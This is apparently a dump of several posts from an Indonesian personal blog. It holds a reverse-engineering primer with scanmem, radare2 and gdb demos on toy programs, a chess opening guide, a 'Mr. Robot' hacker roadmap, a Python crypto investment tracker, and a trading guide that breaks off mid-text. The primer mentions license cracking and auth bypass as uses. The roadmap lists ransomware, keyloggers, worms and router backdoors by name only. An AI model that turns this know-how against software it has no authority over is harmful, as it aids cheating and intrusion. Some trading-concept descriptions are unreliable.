enkripsi, atau memodifikasi nilai variabel. Contoh: Tools seperti Cheat Engine memanipulasi nilai di memory untuk mengubah perilaku game/program. 1. Analogi Sederhana CPU = Koki yang memasak. RAM = Meja tempat koki menaruh bahan \u0026amp; alat yang sedang dipakai. Hard Disk = Lemari penyimpanan (untuk bahan yang tidak sedang dipakai). 2. Contoh Nyata di Linux a. Melihat Penggunaan RAM Jalankan di terminal:\nfree -h Output:\ntotal used free Mem: 16G 5.2G 10G Swap: 2G 0B 2G Mem: RAM fisik (16GB total, 5.2GB dipakai). Swap: RAM cadangan di hard disk. b. Lihat Program yang Pakai RAM top -o %MEM # Urutkan berdasarkan penggunaan RAM Contoh output:\nPID USER %MEM COMMAND 1234 user 15% chrome 5678 user 8% vscode Artinya:\nGoogle Chrome pakai 15% RAM. VS Code pakai 8% RAM. 3. Reverse Engineering \u0026amp; RAM Dalam RE, RAM adalah tempat kita:\nMencari password (misalnya, game menyimpan nyawa player di RAM). Memodifikasi nilai (misalnya, mengganti \u0026ldquo;skor=100\u0026rdquo; jadi \u0026ldquo;skor=9999\u0026rdquo;). Contoh dengan Cheat Engine (Windows): Buka game (misalnya Plants vs Zombies). Cari nilai \u0026ldquo;sun\u0026rdquo; (misalnya 50) di RAM. Ubah jadi 9999 → Nilai di game langsung berubah! Di Linux, kita bisa pakai scanmem (versi sederhana Cheat Engine):\nsudo apt install scanmem # Install dulu scanmem /proc/[PID_game] # Ganti [PID_game] dengan ID proses game 4. Coba Modifikasi RAM Sederhana Buat program C bernama contoh_ram.c:\n#include \u0026lt;stdio.h\u0026gt; int main() { int nilai = 10; printf(\u0026#34;Nilai awal: %d\\n\u0026#34;, nilai); printf(\u0026#34;PID: %d\\n\u0026#34;, getpid()); // Cetak ID proses while (1) { } // Program jalan terus } Langkah-langkah:\nKompilasi \u0026amp; jalankan:\ngcc contoh_ram.c -o contoh_ram ./contoh_ram Output:\nNilai awal: 10 PID: 12345 # Catat PID ini Cari \u0026amp; Ubah Nilai di RAM (di terminal lain):\nsudo scanmem 12345 # Ganti 12345 dengan PID program Di scanmem:\n\u0026gt; 10 # Cari nilai \u0026#34;10\u0026#34; di RAM \u0026gt; list # Lihat alamat memory yang menyimpan 10 \u0026gt; [alamat] 9999 # Ganti nilai di alamat itu jadi 9999 Lihat terminal program contoh_ram → Nilai berubah!\n5. Visualisasi RAM dalam Program Alamat RAM Nilai 0x7ffc1234 10 # Awalnya 0x7ffc1234 9999 # Setelah dimodifikasi 3. Disk (Storage: HDD/SSD) Apa itu? Penyimpanan permanen untuk program dan data (seperti file EXE, DLL, atau dokumen). Fungsi dalam RE: File di disk (misalnya, binary/executable) adalah target utama reverse engineering. Anda menganalisis bagaimana program disimpan di disk (struktur file, kode terkompilasi, dll.). Contoh: Tools seperti Ghidra atau IDA Pro membaca file EXE dari disk untuk dianalisis. 1. Disk vs RAM: Perbedaan Krusial RAM Disk (HDD/SSD) Penyimpanan sementara (volatile) Penyimpanan permanen (non-volatile) Akses cepat (CPU langsung baca) Akses lambat Contoh: Variabel program Contoh: File EXE, DLL, dokumen Dalam RE:\nFile di disk (seperti binary ls atau chrome) adalah target analisis. Kita bisa memodifikasi file di disk untuk mengubah perilaku program. 2. Analisis File Binary dengan radare2 Contoh Praktis: Kita akan analisis binary sederhana di Linux (bisa pakai /bin/ls atau buat program sendiri).\nLangkah 1: Buat Program Sederhana Buat file contoh_disk.c:\n#include \u0026lt;stdio.h\u0026gt; void greet() { printf(\u0026#34;Password: 12345\\n\u0026#34;); // Target kita: temukan string ini di binary! } int main() { greet(); return 0; } Kompilasi:\ngcc contoh_disk.c -o contoh_disk Langkah 2: Buka Binary dengan radare2 r2 -AAA ./contoh_disk # Buka file dengan analisis penuh Perintah Dasar radare2 Cari Fungsi (main dan greet)\n[0x00401050]\u0026gt; afl # List semua fungsi [0x00401050]\u0026gt; s main # Pindah ke fungsi main [0x00401050]\u0026gt; pdf # Disassemble fungsi Output:\n┌ 23: int main (); │ 0x00401112 55 push rbp │ 0x00401113 4889e5 mov rbp, rsp │ 0x00401116 e8d5ffffff call greet ; Panggil fungsi greet │ 0x0040111b b800000000 mov eax, 0 │ 0x00401120 5d pop rbp └ 0x00401121 c3 ret Cari String \u0026ldquo;Password\u0026rdquo;\n[0x00401050]\u0026gt; iz # List semua string di binary Output:\nvaddr=0x00402004 paddr=0x00002004 ordinal=000 sz=12 len=11 section=.rodata type=ascii string=Password: 12345 Lihat Isi Disk (Hex View)\n[0x00401050]\u0026gt; px @ 0x00402004 # Lihat data di alamat string Output (hexdump):\n0x00402004 50 61 73 73 77 6f 72 64 3a 20 31 32 33 34 35 00 Password: 12345. Modifikasi Binary (Opsional)\nGanti string \u0026ldquo;12345\u0026rdquo; jadi \u0026ldquo;ABCDE\u0026rdquo;:\n[0x00401050]\u0026gt; wx ABCDE @ 0x0040200B # Overwrite di disk [0x00401050]\u0026gt; q # Keluar Jalankan program:\n./contoh_disk Output:\nPassword: ABCDE # String berhasil diubah! 3. Visualisasi Struktur File di Disk Binary `contoh_disk` di Disk: ┌─────────────────┐ │ Header (ELF) │ # Informasi metadata ├─────────────────┤ │ .text │ # Kode mesin (fungsi main, greet) ├─────────────────┤ │ .rodata │ # String \u0026#34;Password: 12345\u0026#34; ├─────────────────┤ │ ... │ # Section lain └─────────────────┘ radare2 membantu melihat/memodifikasi bagian ini. 4. Contoh Nyata: Analisis /bin/ls r2 -AAA /bin/ls Cari fungsi main: [0x00401050]\u0026gt; afl~main # Cari fungsi main [0x00401050]\u0026gt; s main # Pindah ke main [0x00401050]\u0026gt; pdf # Disassemble Cari string (misalnya pesan error): [0x00401050]\u0026gt; iz~cannot # Cari string \u0026#34;cannot\u0026#34; 5. Fungsi dalam Reverse Engineering Menganalisis malware (file binary mencurigakan). Memodifikasi program (crack license, bypass auth). Memahami struktur executable (ELF, PE). 4. Register Apa itu? Penyimpanan kecil super cepat di dalam CPU untuk memproses data secara langsung. Fungsi dalam RE: Register menyimpan nilai sementara saat CPU menjalankan instruksi (misalnya, hasil perhitungan atau alamat memory). Dalam assembly/RE, Anda sering melihat register seperti: EAX/RAX: Menyimpan hasil operasi. EIP/RIP: Menunjuk ke instruksi berikutnya yang akan dijalankan. Contoh: Saat debugging dengan x64dbg, Anda memantau perubahan register untuk memahami alur program. Bayangkan register seperti meja kecil di depan koki (CPU):\nHanya muat sedikit data (4-8 byte), tapi paling cepat diakses. Dipakai untuk operasi matematis, alamat memory, dll. 1. Jenis Register Penting Register Fungsi Contoh (x64) RAX/EAX Menyimpan hasil operasi (return value) mov eax, 5 RIP/EIP Instruction Pointer (alamat instruksi berikutnya) 0x401000 RSP/ESP Stack Pointer (alamat stack) 0x7fffffff RBX/EBX Penyimpanan sementara mov ebx, eax Catatan:\nRAX (64-bit), EAX (32-bit), AX (16-bit), AH/AL (8-bit). EIP/RIP sangat penting untuk kontrol alur program (misal: eksploitasi buffer overflow). 2. Contoh Nyata dengan gdb Buat file contoh_register.c:\n#include \u0026lt;stdio.h\u0026gt; int main() { int a = 5; int b = 10; int c = a + b; // Perhatikan register RAX/EAX! return 0; } Langkah Debugging Kompilasi dengan debug info:\ngcc -g contoh_register.c -o contoh_register Buka dengan gdb:\ngdb ./contoh_register Set Breakpoint dan lihat register:\n(gdb) break main # Set breakpoint di main (gdb) run # Jalankan program (gdb) disassemble # Lihat assembly (gdb) info registers # Lihat semua register Output Assembly mov DWORD PTR [rbp-0x4], 0x5 ; a = 5 mov DWORD PTR [rbp-0x8], 0xa ; b = 10 mov eax, DWORD PTR [rbp-0x4] ; EAX = a add eax, DWORD PTR [rbp-0x8] ; EAX += b (EAX = 15) Monitor Register Sebelum add, cek eax: (gdb) p $eax # Output: 5 Setelah add, cek lagi: (gdb) p $eax # Output: 15 3. Reverse Engineering dengan Register Memodifikasi RIP/EIP: Mengubah alur eksekusi program (misal: loncat ke fungsi rahasia). Membaca RAX/EAX: Mendapatkan hasil perhitungan (misal: hasil dekripsi password). Contoh Game Hacking:\nCari alamat nilai \u0026ldquo;nyawa player\u0026rdquo; di RAM. Trace instruksi yang mengubah nilai itu (misal: sub eax, 1). Ganti jadi add eax, 100 untuk cheat unlimited health! 4. Visualisasi Register CPU ┌─────────────┐ │ RAX = 15 │ ← Hasil a + b │ RIP = 0x40 │ ← Alamat instruksi berikutnya │ RSP = 0x7f │ ← Alamat stack └─────────────┘ 5. Tools untuk Analisis Register Linux: gdb (dengan info registers). Windows: x64dbg/OllyDbg (tampilan GUI lebih mudah). Radare2: r2 -d ./contoh_register [0x00401050]\u0026gt; dr # Lihat register [0x00401050]\u0026gt; ds # Step instruksi Kesimpulan Register adalah \u0026ldquo;tangan\u0026rdquo; CPU untuk memanipulasi data. EAX/RAX dan EIP/RIP paling sering dipantau saat RE. Latihan: Gunakan gdb untuk modifikasi nilai register (set $eax=100). Coba ubah RIP untuk loncat ke fungsi lain (advanced). Tips:\nPelajari assembly dasar (mov, add, jmp) untuk memahami register. Jika bingung, ulangi contoh gdb di atas! Next: Gabungkan konsep CPU, RAM, Disk, dan Register untuk analisis binary lengkap! 🚀\nAnalog Sederhana untuk Pemula Bayangkan komputer seperti tukang masak (CPU) yang:\nMengambil resep dari buku masak (disk), Menyiapkan bahan di meja dapur (RAM), Mengolah bahan dengan tangan/alat kecil (register). Dalam reverse engineering, Anda adalah orang yang:\nMembongkar resep (program) untuk melihat bagaimana ia bekerja, Memodifikasi bahan (memory/register) untuk mengubah hasil masakan (perilaku program). Penting untuk Reverse Engineering CPU + Register: Memahami assembly language (bahasa mesin) untuk melacak eksekusi program. Memory: Mem-scan/memodifikasi nilai saat runtime (misalnya, bypassing license check). Disk: Menganalisis file binary/executable untuk menemukan vulnerability atau algoritma. Mulailah dengan tools seperti Cheat Engine (memory editing) atau Ghidra (binary analysis) untuk mempraktikkan konsep ini!\n","permalink":"/posts/reverse-engineering-01/","title":"Apa itu CPU, memory, disk, register dalam reverse engineering (RE)"},{"content":"","permalink":"/tags/chess/","title":"Chess"},{"content":"♟️ Opening Catur: Sicilian Defense (Pertahanan Sisilia) Salah satu opening paling agresif dan sering dipakai Grandmaster dunia. Cocok buat kamu yang suka gaya main counter-attack!\n📌 Dasar Opening Langkah:\n1. e4 c5 Hitam menyerang pusat dengan pion sayap, bukan pion tengah seperti e5. Tujuannya mengganggu dominasi Putih dan membuka jalan bagi kuda dan gajah.\nPutih: 1. e4 Menguasai pusat (d5 \u0026amp; f5), membuka jalur untuk gajah dan menteri.\nHitam: 1\u0026hellip; c5 Tidak langsung menantang pion e4 dengan e5, tapi menyerang d4 secara tidak langsung. → Tujuan:\nMengganggu dominasi Putih di pusat.\nMenyiapkan kontrol atas petak d4 dengan pion c dan kuda Nc6.\nMenciptakan ketidakseimbangan posisi sejak awal (asimetri).\nKelebihan Sicilian:\nPeluang menang lebih tinggi untuk Hitam dibanding e5.\nFleksibel: bisa masuk varian tajam (Najdorf, Dragon) atau solid (Scheveningen).\n🧩 3 Variasi Populer Sicilian Defense 1. 🛡️ Najdorf Variation Langkah:\n1. e4 c5 2. Nf3 d6 3. d4 cxd4 4. Nxd4 Nf6 5. Nc3 a6 Variasi ini dikenal sebagai Najdorf Variation, salah satu sistem paling terkenal dan ditakuti dalam Sicilian Defense.\nLangkah 5\u0026hellip;a6 adalah ciri khasnya. Tujuan utamanya:\n🔒 Mencegah manuver kuda atau gajah putih ke petak b5, yang bisa mengganggu pengembangan atau menukar gajah penting Hitam di e7.\n📈 Menyiapkan ekspansi sayap ratu, terutama dengan \u0026hellip;b5 dan \u0026hellip;Bb7 di masa depan.\n⏳ Menunda komitmen pion tengah (seperti \u0026hellip;e5 atau \u0026hellip;e6), sambil memantau posisi putih lebih lanjut.\n🧠 Karakter Posisi\nHitam bermain fleksibel, tidak langsung menyatakan niat tengah.\nPutih bisa melanjutkan dengan berbagai sistem: Be3 (English Attack), Bg5, atau f4 (Sozin/Velimirovic).\nKamu bisa melihat gameplay dari Mikhail Tal vs Olafsson dalam bermain opening variasi najdorf ini\n2. 🌀 Dragon Variation Langkah:\n1. e4 c5 2. Nf3 d6 3. d4 cxd4 4. Nxd4 Nf6 5. Nc3 g6 Hitam mempersiapkan fianchetto gajah ke g7. Posisi gajah seperti \u0026ldquo;naga\u0026rdquo; yang mengontrol diagonal panjang.\nDengan 5\u0026hellip;g6, Hitam memilih Dragon Variation, dinamai dari bentuk pionnya yang menyerupai ekor naga. Tujuan utama langkah ini:\n🔭 Menyiapkan fianchetto gajah ke g7, yang akan mengontrol diagonal panjang h8–a1.\n🛡️ Membuat pertahanan solid di sayap raja.\n⚔️ Memicu permainan tajam—Putih biasanya menyerang di sayap raja, sementara Hitam menyerang balik di sayap ratu.\n3. 🧱 Scheveningen Variation Langkah:\n1. e4 c5 2. Nf3 d6 3. d4 cxd4 4. Nxd4 Nf6 5. Nc3 e6 Pada langkah kelima, langkah \u0026hellip;e6 dari Hitam membentuk formasi pion d6-e6, yang sering disebut sebagai \u0026ldquo;struktur Scheveningen\u0026rdquo; — dikenal karena kestabilannya.\nFormasi ini memberikan beberapa keuntungan strategis bagi Hitam:\nSolid dan fleksibel: Kombinasi pion d6 dan e6 menjaga pusat dan meminimalkan kelemahan di awal permainan.\nMenahan serangan cepat Putih: Dengan posisi yang kompak, Hitam tidak terlalu rentan terhadap serangan awal seperti Greek Gift atau serangan minor di sayap raja.\nPengembangan bidak fleksibel: Hitam bisa memilih untuk mengembangkan gajah gelap ke e7 atau bahkan ke b4, tergantung situasi. Kuda juga bisa manuver ke rute c6-a5-c4 jika dibutuhkan.\nTidak buru-buru menyerang: Hitam tidak langsung melancarkan serangan balik, melainkan menyiapkan posisi yang kuat sebelum memilih arah permainan — bisa bertahan, menyerang pusat, atau bermain di sayap.\nSingkatnya, struktur ini adalah pilihan strategis bagi Hitam untuk mendapatkan posisi solid tanpa terlalu membuka diri terhadap taktik cepat dari lawan.\n✅ Tips Buat Pemula Pelajari satu variasi dulu sampai paham. Jaga struktur pion biar gak gampang diserang. Jangan asal nyerang, tunggu momen counter yang pas! 🏁 Penutup Sicilian Defense cocok banget buat kamu yang gak suka gaya main pasif. Dengan memahami 3 variasi di atas, kamu bisa makin percaya diri saat pegang Hitam!\nKalau kamu suka artikel ini, jangan lupa share ke temenmu yang suka catur juga! 😉\n","permalink":"/posts/sicilian-defense/","title":"Panduan Opening Catur: Sicilian Defense + 3 Variasi Populer"},{"content":"","permalink":"/tags/pentest/","title":"Pentest"},{"content":"\nMr. Robot showcases a variety of hacking techniques and skills that can serve as a roadmap for aspiring ethical hackers. Below is a concise guide to hacking methods and essential skills based on the series.\nCore Skills to Master Social Engineering: Manipulate human behavior to extract sensitive information.\nNetwork Analysis: Use tools like Wireshark to monitor traffic and detect vulnerabilities.\nCryptography: Encrypt and decrypt data, understand hashing algorithms, and break weak cryptographic implementations.\nPenetration Testing: Perform assessments to identify and exploit system weaknesses.\nReverse Engineering: Deconstruct software or malware to understand its functionality.\nScripting \u0026amp; Automation: Develop custom scripts in Python, Bash, or PowerShell.\nExploitation Frameworks: Master tools like Metasploit for streamlined attacks.\nDigital Forensics: Investigate and mitigate cyber incidents by analyzing digital evidence.\nPrivilege Escalation: Elevate access rights in compromised systems.\nTechniques Highlighted in Mr. Robot Password Attacks Brute force (e.g., using Hashcat).\nKeystroke logging (Keyloggers).\nNetwork Exploits Man-in-the-Middle (MITM) attacks.\nPacket sniffing and injection.\nDNS manipulation.\nSystem Exploitation Rootkits and privilege escalation.\nCold boot attacks to extract RAM data.\nZero-day exploits.\nPhysical Attacks USB Rubber Ducky to inject payloads.\nCloning drives for offline analysis.\nSocial Engineering Phishing and spear phishing campaigns.\nImpersonation to extract credentials.\nData Exfiltration Using encrypted channels or cloud storage to steal sensitive information.\nSteganography to hide data in plain sight.\nIoT \u0026amp; Smart Devices Exploiting IoT vulnerabilities to infiltrate networks. System Disruption Ransomware deployment.\nDistributed Denial of Service (DDoS) attacks.\nCustom Exploits Developing firmware backdoors for routers.\nWriting worms for automated network attacks.\nAdvanced Techniques Blockchain tracking to deanonymize transactions.\nHoneypot and honeynet setups for counter-intelligence.\nSuggested Learning Path Beginner Learn basic programming (Python, Bash).\nUnderstand networking fundamentals (TCP/IP, DNS).\nExplore Linux systems and commands.\nIntermediate Practice penetration testing using tools like Metasploit and Burp Suite.\nExperiment with social engineering tactics in controlled environments.\nStart learning cryptography and encryption techniques.\nAdvanced Develop exploits using zero-day vulnerabilities.\nDive into reverse engineering malware and advanced network forensics.\nExplore IoT device hacking and hardware-level attacks.\nThis roadmap combines fictional inspiration with real-world applicability. By mastering these skills and techniques, you can become a proficient ethical hacker or cybersecurity expert.\nif i\u0026rsquo;m (writer) have some failure explanation, you can give pull request or suggestion. all contributions are welcome.\nhttps://github.com/hnvdie/hnvdie.github.io/tree/master/content/posts\n","permalink":"/posts/how-to-become-a-hacker/","title":"Roadmap to Become an Expert Hacker (Inspired by Mr. Robot)"},{"content":"","permalink":"/tags/analysis/","title":"Analysis"},{"content":"\nGhostNet adalah sebuah alat pengelola investasi crypto yang saya buat untuk membantu kamu dalam melacak nilai investasi dan return dari berbagai mata uang kripto. Dengan antarmuka yang sederhana, program ini dapat membantu kamu mengatur dan memantau aset crypto dengan lebih terstruktur.\nFitur Utama Tambah Investasi \u0026amp; Return: Menambahkan nilai investasi dan return untuk setiap mata uang kripto yang kamu pilih. Edit Data: Mengubah data investasi dan return jika terjadi perubahan nilai. Hapus Data: Menghapus data untuk mata uang kripto yang sudah tidak kamu perhatikan. Statistik Lengkap: Menampilkan total investasi, return, serta keuntungan atau kerugian secara keseluruhan. Desain Sederhana: Tampilan yang bersih dan mudah dipahami, cocok untuk pengguna pemula hingga yang sudah berpengalaman. Penjelasan Kode Program Di bawah ini adalah penjelasan mengenai bagian-bagian kode GhostNet yang saya buat, serta bagaimana setiap fungsi berperan dalam program.\n1. Fungsi read_data Fungsi ini digunakan untuk membaca file yang berisi data investasi dan return. Jika file tidak ditemukan, maka fungsi ini akan membuat file baru dengan header yang sudah ditentukan.\ndef read_data(filename): data = {} if not os.path.exists(filename): with open(filename, \u0026#39;w\u0026#39;) as f: f.write(\u0026#34;@ currency, invest, return\\n\u0026#34;) # Header file print(f\u0026#34;info: create new {filename}\u0026#34;) else: with open(filename, \u0026#39;r\u0026#39;) as f: lines = f.readlines()[1:] # Skip header line for line in lines: parts = line.strip().split(\u0026#39;, \u0026#39;) if len(parts) == 3: currency = parts[0].strip().lower() invest = int(parts[1]) return_value = int(parts[2]) data[currency] = {\u0026#39;invest\u0026#39;: invest, \u0026#39;return\u0026#39;: return_value} return data Fungsi write_data Fungsi ini digunakan untuk menulis data ke dalam file setelah terjadi perubahan, seperti menambah atau mengedit nilai investasi dan return.\ndef write_data(filename, data): with open(filename, \u0026#39;w\u0026#39;) as f: f.write(\u0026#34;@ currency, invest, return\\n\u0026#34;) # Header file for currency, values in data.items(): f.write(f\u0026#34;{currency.upper()}, {values[\u0026#39;invest\u0026#39;]}, {values[\u0026#39;return\u0026#39;]}\\n\u0026#34;) Fungsi add_investment Fungsi ini digunakan untuk menambah jumlah investasi pada mata uang kripto tertentu. Jika mata uang belum ada dalam data, fungsi ini akan menambahkannya.\ndef add_investment(data, currency, invest_amount): currency = currency.lower() if currency in data: data[currency][\u0026#39;invest\u0026#39;] += invest_amount else: data[currency] = {\u0026#39;invest\u0026#39;: invest_amount, \u0026#39;return\u0026#39;: 0} print(f\u0026#34;Investment added: {currency.upper()} with {format_currency(invest_amount)}\u0026#34;) Fungsi add_return Fungsi ini digunakan untuk menambahkan return yang diperoleh dari investasi pada mata uang kripto tertentu.\ndef add_return(data, currency, return_amount): currency = currency.lower() if currency in data: data[currency][\u0026#39;return\u0026#39;] += return_amount else: data[currency] = {\u0026#39;invest\u0026#39;: 0, \u0026#39;return\u0026#39;: return_amount} print(f\u0026#34;Return added: {currency.upper()} with {format_currency(return_amount)}\u0026#34;) Fungsi edit_data Fungsi ini memungkinkan kamu untuk mengubah nilai investasi dan return dari mata uang kripto yang ada.\ndef edit_data(data, currency, invest=None, return_value=None): currency = currency.lower() if currency in data: if invest is not None: data[currency][\u0026#39;invest\u0026#39;] = invest if return_value is not None: data[currency][\u0026#39;return\u0026#39;] = return_value print(f\u0026#34;Data edited for {currency.upper()}\u0026#34;) else: print(f\u0026#34;Currency {currency} not found.\u0026#34;) Fungsi delete_data Fungsi ini digunakan untuk menghapus data untuk mata uang yang sudah tidak lagi kamu perhatikan. Fungsi ini menjaga agar data tetap terorganisir.\ndef delete_data(data, currency): currency = currency.lower() if currency in data: del data[currency] print(f\u0026#34;{currency.upper()} data has been deleted.\u0026#34;) else: print(f\u0026#34;Currency {currency} not found.\u0026#34;) Fungsi display_statistics Fungsi ini akan menampilkan statistik total investasi, return, serta keuntungan atau kerugian dari seluruh data mata uang kripto yang tercatat.\ndef display_statistics(data): total_investment = sum([values[\u0026#39;invest\u0026#39;] for values in data.values()]) total_return = sum([values[\u0026#39;return\u0026#39;] for values in data.values()]) total_profit_loss = total_return - total_investment print(\u0026#34;-\u0026#34;*100) print(\u0026#34;Statistics:\u0026#34;) print(f\u0026#34;Total Investment: {format_currency(total_investment)}\u0026#34;) print(f\u0026#34;Total Return: {format_currency(total_return)}\u0026#34;) print(f\u0026#34;Total Profit/Loss: {format_currency(total_profit_loss)}\u0026#34;) print(\u0026#34;\\nCurrency Breakdown:\u0026#34;) for currency, values in data.items(): print(f\u0026#34;{currency.upper()}: Invest = {format_currency(values[\u0026#39;invest\u0026#39;])}, Return = {format_currency(values[\u0026#39;return\u0026#39;])}\u0026#34;) print(\u0026#34;-\u0026#34;*100) print() Fungsi format_currency Fungsi ini digunakan untuk memformat nilai investasi atau return menjadi lebih mudah dibaca, dengan menambahkan simbol mata uang dan memisahkan angka dengan titik.\ndef format_currency(amount, symbol=\u0026#34;USD\u0026#34;): return f\u0026#34;{symbol} {amount:,}\u0026#34;.replace(\u0026#34;,\u0026#34;, \u0026#34;.\u0026#34;) Cara Penggunaan Menambahkan Investasi Kamu bisa menambahkan investasi dengan memilih menu \u0026ldquo;Tambah Investasi\u0026rdquo; dan memasukkan jumlah dana yang kamu investasikan dalam mata uang crypto pilihanmu.\nMenambahkan Return Untuk menambah return, pilih menu \u0026ldquo;Tambah Return\u0026rdquo; dan masukkan jumlah return yang kamu peroleh.\nMengedit Data Jika ada perubahan, misalnya karena investasi atau return berubah, kamu bisa mengeditnya melalui menu \u0026ldquo;Edit Data\u0026rdquo;.\nMenghapus Data Jika ada mata uang kripto yang sudah tidak kamu perhatikan, kamu bisa menghapusnya dengan memilih \u0026ldquo;Hapus Data\u0026rdquo;.\nMelihat Statistik Menu \u0026ldquo;Statistik\u0026rdquo; akan menunjukkan gambaran umum tentang total investasi, return, serta profit atau kerugian yang kamu peroleh.\nPengembangan Lebih Lanjut Program ini masih dapat dikembangkan lebih lanjut, seperti penambahan fitur-fitur baru, integrasi dengan API untuk mengupdate data harga cryptocurrency secara otomatis, dan lainnya.\nKamu bisa mengakses GhostNet di Github.\n","permalink":"/posts/make-project-invest-tracker/","title":"Membuat Program Pengingat Investasi Crypto Sederhana Dengan Python"},{"content":"Trading adalah seni dan ilmu yang membutuhkan pemahaman mendalam terhadap berbagai alat dan indikator yang dapat membantu kita membuat keputusan yang lebih cerdas di pasar. Bagi pemula yang bingung dari mana memulai, artikel ini akan memberikan jalur pembelajaran yang sistematis dan terstruktur, mulai dari konsep dasar hingga teknik lanjutan. Setiap konsep dan alat yang akan dibahas memiliki peran penting dalam membentuk analisis teknikal yang kuat.\n1. Candlestick Patterns Candlestick patterns adalah fondasi dari analisis teknikal yang mengungkapkan psikologi pasar melalui formasi harga dalam grafik. Menguasai pola candlestick seperti Doji, Hammer, Engulfing, dan Morning/Evening Star akan memberikan wawasan penting tentang kemungkinan pembalikan harga atau kelanjutan tren. Belajar membaca candlestick akan menjadi langkah pertama yang krusial dalam memahami sentimen pasar.\n2. Volume Volume adalah salah satu indikator paling penting dalam analisis teknikal. Volume menunjukkan seberapa banyak transaksi yang terjadi pada suatu periode waktu. Kombinasi antara pergerakan harga dan volume memberikan sinyal yang lebih kuat. Misalnya, pergerakan harga yang didukung oleh volume yang besar menunjukkan bahwa tren tersebut lebih kuat dan berpotensi berkelanjutan.\n3. Support \u0026amp; Resistance / Supply \u0026amp; Demand Level support dan resistance adalah titik di mana harga cenderung berbalik arah. Support adalah area di mana harga biasanya berhenti turun, sementara resistance adalah area di mana harga cenderung berhenti naik. Supply and demand menggambarkan zona di mana terdapat keseimbangan antara penjual dan pembeli, yang mempengaruhi harga. Memahami kedua konsep ini adalah dasar yang penting dalam menetapkan titik entry dan exit.\n4. Additional Technical Indicators Ada berbagai indikator tambahan yang dapat digunakan untuk mengonfirmasi sinyal yang diberikan oleh grafik harga. Beberapa indikator yang populer antara lain:\nRSI (Relative Strength Index): Menunjukkan kondisi overbought atau oversold pada pasar. Jika RSI lebih dari 70, pasar dianggap overbought, dan jika di bawah 30, pasar dianggap oversold. MA (Moving Average) dan EMA (Exponential Moving Average): Digunakan untuk mengidentifikasi arah tren. MA sederhana memberikan rata-rata harga dalam periode waktu tertentu, sedangkan EMA lebih menekankan pada harga terbaru, memberikan sinyal yang lebih cepat. MACD (Moving Average Convergence Divergence): Menggunakan dua MA (biasanya 12 dan 26 hari) untuk menunjukkan sinyal beli atau jual. Ketika MACD melintasi garis sinyal, ini bisa menjadi sinyal untuk entry atau exit. Volume Oscillator: Mengukur perbedaan antara dua volume MA, memberikan wawasan tentang kekuatan tren. Stochastic Oscillator: Digunakan untuk mengukur momentum pasar. Jika nilai indikator mendekati 0, pasar oversold, dan jika mendekati 100, pasar overbought. Money Flow Index (MFI): Kombinasi antara volume dan harga untuk mengidentifikasi pembalikan harga. MFI yang tinggi menunjukkan kemungkinan pembalikan harga. 5. Price Action Price action adalah metode analisis yang hanya mengandalkan pergerakan harga tanpa menggunakan indikator teknikal tambahan. Ini mengajarkan kita untuk membaca pola pergerakan harga dan membuat keputusan berdasarkan konteks pasar saat itu, termasuk level-level harga kunci dan pola candlestick.\n6. Take Profit \u0026amp; Psychology Menentukan level take profit dan memahami psikologi trading adalah bagian integral dari setiap trading setup. Jangan hanya fokus pada strategi teknikal; penting untuk memahami kapan dan bagaimana keluar dari posisi, serta menjaga emosi tetap terkendali agar tidak terjebak dalam overtrading atau takut kehilangan kesempatan. Pengelolaan psikologi yang baik juga melibatkan pengendalian diri saat pasar bergerak melawan posisi kita dan pentingnya berpegang pada rencana trading untuk menghindari keputusan impulsif.\n7. Fibonacci Retracement and Extension Fibonacci adalah alat yang sangat berguna untuk menentukan level support dan resistance potensial. Dengan menggunakan level retracement (23.6%, 38.2%, 50%, 61.8%, dll.) dan ekstensi (127.2%, 161.8%), trader dapat memprediksi area pembalikan harga atau kelanjutan tren.\n8. PO3 (Pattern of 3) PO3 adalah konsep yang berbicara tentang pola pergerakan harga dalam tiga langkah. Misalnya, setelah harga melakukan pergerakan pertama dan kedua, langkah ketiga sering kali menjadi pergerakan yang signifikan, baik itu pembalikan atau kelanjutan tren. Mengidentifikasi PO3 dapat membantu trader menangkap peluang pasar yang lebih besar.\n9. Quarterly Theory Quarterly theory adalah pendekatan yang mengaitkan pergerakan harga dengan siklus tahunan dan triwulanan. Menurut teori ini, pasar bergerak dalam pola tertentu pada periode kuartalan, yang dapat digunakan untuk merencanakan strategi jangka menengah.\n10. Unicorn Model Unicorn model adalah pendekatan analisis teknikal yang menggabungkan berbagai indikator dan pola harga untuk mengidentifikasi titik-titik entry dan exit terbaik. Model ini menganggap pasar seperti unicorn—unik dan tidak dapat diprediksi, tetapi dengan pola yang dapat dianalisis dengan alat yang tepat.\n11. ICT (Inner Circle Trader) ICT adalah metode yang lebih maju yang mencakup pemahaman mendalam tentang dinamika pasar, termasuk manipulasi harga oleh institusi besar, struktur pasar, dan siklus harga. Teknik-teknik ICT mengajarkan trader untuk memahami bagaimana bank dan institusi besar bergerak di pasar dan bagaimana hal itu memengaruhi harga.\n12. AMD (Advanced Market Dynamics) AMD adalah pendekatan lanjutan yang melibatkan analisis pasar dengan fokus pada pergerakan harga berdasarkan dinamika internal pasar. Teknik ini juga mengamati perilaku pasar secara keseluruhan, seperti likuiditas dan sentimen pasar. Dalam AMD, trader belajar mengenali pola-pola pergerakan harga yang tidak terdeteksi oleh indikator teknikal sederhana.\n13. SBKZ SBKZ adalah metode analisis teknikal yang menggabungkan analisis grafik harga dengan analisis sentimen dan perilaku pasar. SBKZ bertujuan untuk memberikan wawasan yang lebih holistik tentang kondisi pasar dan memungkinkan trader untuk membuat keputusan yang lebih baik dengan mempertimbangkan banyak faktor yang mempengaruhi harga.\n14. MMXM MMXM adalah model yang menggabungkan berbagai pendekatan dalam analisis teknikal, dengan penekanan pada pengelolaan risiko dan strategi posisi. Model ini membantu trader memahami bagaimana mengelola portofolio dan menyesuaikan posisi dengan kondisi pasar. Pengelolaan risiko yang baik sangat penting untuk memastikan bahwa potensi kerugian tetap terkendali dalam setiap trading yang dilakukan.\n15. FVG (Fair Value Gap) \u0026amp; TS (Trend Shift) FVG dan TS adalah konsep lanjutan yang berfokus pada analisis gap harga (FVG) dan pergeseran tren (TS). FVG mengidentifikasi area harga di mana terjadi kesenjangan dalam pergerakan harga, sementara TS mengidentifikasi momen di mana tren pasar berbalik arah. Keduanya sangat berguna untuk mengidentifikasi titik-titik entry yang optimal dan memaksimalkan potensi keuntungan.\nRisiko dan Pengelolaan Keuangan dalam Trading Salah satu aspek yang sangat penting dalam trading adalah pengelolaan risiko dan manajemen keuangan. Meskipun banyak teknik dan indikator yang dapat membantu trader membuat keputusan yang lebih baik, tanpa pengelolaan risiko yang tepat, trader dapat dengan 